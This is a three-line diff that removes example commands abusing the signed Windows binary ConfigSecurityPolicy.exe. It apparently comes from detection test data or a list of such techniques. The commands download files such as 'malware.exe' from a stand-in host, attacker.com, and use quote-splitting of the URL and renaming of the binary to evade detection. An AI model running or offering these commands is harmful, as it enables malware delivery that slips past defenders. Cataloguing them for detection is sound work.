@@ -1,3 +1,0 @@
-ConfigSecurityPolicy.exe htt"p"://attacker.com/file.exe
-ConfigSecurityPolicy.exe payload.exe
-copy ConfigSecurityPolicy.exe csp.exe && csp.exe http://attacker.com/malware.exe
